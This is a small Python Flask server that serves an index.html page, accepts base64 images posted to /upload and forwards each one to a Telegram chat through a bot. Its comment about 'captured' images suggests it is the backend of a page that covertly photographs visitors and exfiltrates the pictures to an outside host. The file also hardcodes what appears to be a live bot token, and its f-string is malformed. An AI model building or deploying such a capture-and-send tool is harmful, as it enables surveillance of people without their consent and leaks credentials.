import base64
import os
from flask import Flask, request, jsonify, send_from_directory
import requests

app = Flask(__name__)

# Replace with your Telegram Bot Token & Chat ID
TELEGRAM_BOT_TOKEN = "123456789:ABCdefGHIjklMNOpqrSTUvwXYZ"
CHAT_ID = "1431507855"

def send_to_telegram(image_data):
    """Send captured image to Telegram"""
    url = f"https://api.telegram.org/bot{7776711379:AAEHnUT_bFqZNHITZx2oPx27u9J0VGoMKgM}/sendPhoto"
    files = {"photo": ("image.png", image_data, "image/png")}
    data = {"chat_id": CHAT_ID}

    try:
        response = requests.post(url, data=data, files=files)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

# Serve index.html when accessing the root route
@app.route("/")
def index():
    return send_from_directory(os.getcwd(), "index.html")

@app.route("/upload", methods=["POST"])
def upload():
    try:
        data = request.json.get("image")
        if not data:
            return jsonify({"error": "No image data received"}), 400

        # Convert Base64 image data back to bytes
        image_data = base64.b64decode(data.split(",")[1])

        # Send image to Telegram
        result = send_to_telegram(image_data)

        return jsonify(result), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    print("✅ Flask Server is Running!")
    app.run(host="0.0.0.0", port=5000, debug=True)
